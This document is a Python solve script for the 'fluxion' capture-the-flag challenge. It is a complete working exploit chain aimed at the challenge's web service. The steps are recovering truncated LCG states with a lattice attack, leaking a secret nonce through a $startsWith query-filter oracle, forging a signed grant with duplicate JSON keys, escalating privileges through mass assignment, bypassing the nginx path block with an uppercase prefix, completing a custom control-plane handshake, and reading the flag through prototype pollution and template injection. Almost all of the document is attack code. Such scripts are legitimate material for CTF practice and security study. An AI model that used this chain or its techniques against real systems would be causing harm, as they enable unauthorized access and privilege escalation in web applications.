#!/usr/bin/env python3
"""
fluxion full chain against the deployed build.
Use the SECOND handout, fluxion-source_856e9e4f4a3b28ad.zip. The first one
predates the control plane and its chain doesn't work live.
    CTF_LOCAL=1 ctf-python solve/solve2.py
    CTF_TARGET=http://fluxion-xxxx.challs.ctf.thefewchosen.com ctf-python solve/solve2.py
"""

import base64
import hashlib
import hmac
import http.client as http_client
import json
import os
import re
import struct
import sys
import time
import urllib.parse
import zlib

BASE = os.environ.get("CTF_TARGET") or ("http://127.0.0.1:13000"
                                        if os.environ.get("CTF_LOCAL") == "1" else "")
if not BASE:
    sys.exit("set CTF_TARGET or CTF_LOCAL=1")
BASE = BASE.rstrip("/")
_P = urllib.parse.urlsplit(BASE)
_HOST = _P.hostname
_PORT = _P.port or (443 if _P.scheme == "https" else 80)
_TLS = _P.scheme == "https"
_PACE = float(os.environ.get("CTF_PACE", "0.03"))
_conn = [None]

# nginx blocks the lowercase /fcp prefix; express routing is case insensitive.
FCP_PATH = os.environ.get("CTF_FCP_PATH", "/FCP")


def _connect():
    if _conn[0] is not None:
        try:
            _conn[0].close()
        except Exception:                                          # noqa: BLE001
            pass
    cls = http_client.HTTPSConnection if _TLS else http_client.HTTPConnection
    _conn[0] = cls(_HOST, _PORT, timeout=30)
    return _conn[0]


def http(path, body=None, ct="application/json", tries=6):
    hdrs = {"content-type": ct, "connection": "keep-alive"}
    last = None
    for attempt in range(tries):
        c = _conn[0] or _connect()
        try:
            c.request("POST" if body is not None else "GET", path, body, hdrs)
            resp = c.getresponse()
            raw = resp.read()
            if _PACE:
                time.sleep(_PACE)
            return resp.status, raw
        except Exception as e:                                     # noqa: BLE001
            last = e
            _connect()
            time.sleep(min(2 ** attempt * 0.4, 6))
    raise RuntimeError("request to %s failed: %r" % (path, last))


def rpc(method, params=None):
    body = json.dumps({"method": method, "params": params or {}}).encode()
    _, raw = http("/api/rpc", body)
    return json.loads(raw.decode() or "{}")


def result(method, params=None):
    r = rpc(method, params)
    if "result" not in r:
        sys.exit("rpc %s failed: %s" % (method, json.dumps(r)[:300]))
    return r["result"]


# ------------------------------------------------ 1. truncated LCG break -----

LCG_A = 6364136223846793005
LCG_C = 1442695040888963407
MOD = 1 << 64
SHIFT = 40
LOW = 1 << SHIFT


def b64u_int(s):
    return int.from_bytes(base64.urlsafe_b64decode(s + "=" * (-len(s) % 4)), "big")


def b64u_state(s):
    return base64.urlsafe_b64encode(s.to_bytes(8, "big")).decode().rstrip("=")


def recover_states(highs):
    from fpylll import CVP, LLL, IntegerMatrix

    n = len(highs)
    coef_a, coef_b = [1], [0]
    for i in range(n - 1):
        k = (LCG_A * highs[i] * LOW + LCG_C - highs[i + 1] * LOW) % MOD
        coef_a.append(LCG_A * coef_a[-1] % MOD)
        coef_b.append((LCG_A * coef_b[-1] + k) % MOD)

    m = n - 1
    basis = IntegerMatrix(m + 1, m + 1)
    for j in range(m):
        basis[0, j] = coef_a[j + 1]
        basis[j + 1, j] = MOD
    basis[0, m] = 1
    LLL.reduction(basis)
    target = [(LOW // 2 - coef_b[j + 1]) % MOD for j in range(m)] + [LOW // 2]
    v = CVP.closest_vector(basis, tuple(target))
    x = v[m] % MOD

    states = [(highs[j] * LOW + (coef_a[j] * x + coef_b[j]) % MOD) for j in range(n)]
    for j in range(n - 1):
        if (LCG_A * states[j] + LCG_C) % MOD != states[j + 1]:
            return None
    return states


def private_hook_token(run_id):
    ev = result("fetchEvents", {"runId": run_id})["events"]
    highs = [b64u_int(e["stepId"]) for e in ev]
    if len(highs) < 4:
        sys.exit("not enough step ids for the lattice")
    st = recover_states(highs)
    if st is None:
        sys.exit("LCG recovery failed the recurrence check")
    return b64u_state((LCG_A * st[-1] + LCG_C) % MOD)


# ------------------------------------------- 2. approvalNonce prefix oracle --

HEX = "0123456789abcdef"


def leak_nonce(run_id, length=16):
    prefix = ""
    for _ in range(length):
        for ch in HEX:
            f = {"runId": run_id, "approvalNonce": {"$startsWith": prefix + ch}}
            if result("searchRuns", {"filter": f})["count"] >= 1:
                prefix += ch
                break
        else:
            sys.exit("nonce oracle stalled at %r" % prefix)
    return prefix


# ------------------------------------------------- 3. grant signing oracle ---

def forge_grant(run_id, nonce):
    doc = ('{"act":"preview","aud":"approvals","runId":"%s","nonce":"%s",'
           '"act":"resume"}' % (run_id, nonce))
    r = result("previewApprovalGrant", {"document": doc})
    if "grant" not in r:
        sys.exit("signing oracle refused: %r" % r)
    return r["grant"]


# ---------------------------------------------------------- 4/5. FCP arm ----

HDR = 13
T_HELLO, T_KEX, T_ARM, T_TICK = 0x01, 0x02, 0x03, 0x04
T_CHALLENGE, T_KEXOK, T_ARMED, T_TOCK, T_ERR = 0x81, 0x82, 0x83, 0x84, 0xEE
FLAG_FINAL = 0x01


def enc_frame(ftype, seq=0, sid=0, payload=b"", flags=0):
    if isinstance(payload, str):
        payload = payload.encode()
    n = len(payload)
    head = (b"FX" + bytes([1, ftype & 0xFF, flags & 0xFF, seq & 0xFF])
            + struct.pack(">I", sid & 0xFFFFFFFF)
            + bytes([(n >> 16) & 0xFF, (n >> 8) & 0xFF, n & 0xFF]) + payload)
    return head + struct.pack(">I", zlib.crc32(head) & 0xFFFFFFFF)


def dec_frame(buf):
    if len(buf) < HDR + 4 or buf[:2] != b"FX" or buf[2] != 1:
        return None
    n = (buf[10] << 16) | (buf[11] << 8) | buf[12]
    if len(buf) != HDR + n + 4:
        return None
    return {"type": buf[3], "flags": buf[4], "seq": buf[5],
            "sid": struct.unpack(">I", buf[6:10])[0],
            "payload": buf[HDR:HDR + n], "raw": bytes(buf)}


def fcp(frame_bytes):
    _, raw = http(FCP_PATH, frame_bytes, ct="application/octet-stream")
    f = dec_frame(raw)
    if f is None:
        raise RuntimeError("undecodable FCP reply: %r" % raw[:120])
    if f["type"] == T_ERR:
        f["err"] = f["payload"].decode("utf-8", "replace")
    return f


def mac(key, msg, n):
    return hmac.new(key, msg, hashlib.sha256).digest()[:n]


def arm_run(run_id, nonce):
    """Full FCP/1 handshake. -> the arm capability token."""
    enr = result("enrollDevice", {"profile": {"tier": "operator",
                                              "scopes": ["read", "arm", "provision"]}})
    if enr.get("tier") != "operator":
        sys.exit("operator mass assignment failed: %r" % enr)

    hello = enc_frame(T_HELLO, seq=0, sid=0, payload=enr["enrollment"])
    ch = fcp(hello)
    if ch["type"] != T_CHALLENGE:
        sys.exit("HELLO refused: %r" % ch.get("err", ch["type"]))
    sid = ch["sid"]
    server_salt = ch["payload"][:8]
    transcript = hello + ch["raw"]

    session_key = mac(nonce.encode(), server_salt, 16)

    kex = enc_frame(T_KEX, seq=1, sid=sid, payload=mac(session_key, transcript, 8))
    ko = fcp(kex)
    if ko["type"] != T_KEXOK:
        sys.exit("KEX refused: %r" % ko.get("err", ko["type"]))
    transcript = transcript + kex + ko["raw"]
    chain = ko["payload"][:8]

    # paced attestation ladder. defaults K=1 delay=0 with RED_FLOOR unset, which is
    # unset, but honour whatever the server actually advertises.
    seq = 2
    count = 0
    while True:
        rung = mac(session_key, b"FXTICK" + chain + bytes([count & 0xFF]), 8)
        t = fcp(enc_frame(T_TICK, seq=seq, sid=sid, payload=rung))
        if t["type"] == T_ERR and t["err"].startswith("E_TOO_SOON:"):
            time.sleep(int(t["err"].split(":")[1]) / 1000.0 + 0.02)
            continue
        if t["type"] != T_TOCK:
            sys.exit("TICK refused: %r" % t.get("err", t["type"]))
        remaining = struct.unpack(">H", t["payload"][0:2])[0]
        chain = t["payload"][6:14]
        count += 1
        seq += 1
        if remaining == 0:
            break

    run_bytes = run_id.encode()
    tag = mac(session_key, transcript + run_bytes, 16)
    a = fcp(enc_frame(T_ARM, seq=seq, sid=sid, payload=run_bytes + tag,
                      flags=FLAG_FINAL))
    if a["type"] != T_ARMED:
        sys.exit("ARM refused: %r" % a.get("err", a["type"]))
    return a["payload"].decode()


# ------------------------------------------------------------- driver -------

FLAG_RE = re.compile(r"TFC(?:CTF)?\{[^}]*\}")


def main():
    print("[*] target %s" % BASE)
    runs = result("fetchRuns")
    admin = [r for r in runs if r["workflowName"] == "admin-provision-approval"]
    if not admin:
        sys.exit("no admin-provision-approval run")
    run_id = admin[0]["runId"]
    print("[*] privileged run %s (%s)" % (run_id, admin[0]["status"]))

    token = private_hook_token(run_id)
    print("[+] private hook token from the truncated LCG: %s" % token)

    nonce = leak_nonce(run_id)
    print("[+] approvalNonce via $startsWith oracle: %s" % nonce)

    grant = forge_grant(run_id, nonce)
    print("[+] act=resume grant signed by the preview oracle")

    arm = arm_run(run_id, nonce)
    print("[+] arm capability minted by the FCP control plane: %s..." % arm[:40])

    r = result("resumeHook", {"token": token, "grant": grant, "armToken": arm,
                              "payload": {"approved": True}})
    print("[*] resumeHook -> %s" % json.dumps(r))
    if r.get("status") != "completed":
        sys.exit("run did not complete")

    caption = "${engine.runs.%s._flag}" % run_id
    pol = {"prefs": {"constructor": {"prototype": {
        "presentation": {"caption": caption, "token": nonce}}}}}
    try:
        print("[*] pollute -> %s" % json.dumps(rpc("saveViewPreferences", pol))[:160])
    except Exception as e:                                          # noqa: BLE001
        # Polluting Object.prototype can wedge the in-flight response; the
        # assignment still happened, so carry on.
        print("[!] pollute request did not return cleanly (%r), continuing" % e)

    out = result("renderRunReport", {"runId": run_id})
    blob = json.dumps(out)
    print("[*] renderRunReport -> %s" % blob[:400])

    m = FLAG_RE.search(blob)
    if not m:
        sys.exit("no flag in the render diagnostic")
    print("\nFLAG: %s" % m.group(0))
    return m.group(0)


if __name__ == "__main__":
    main()
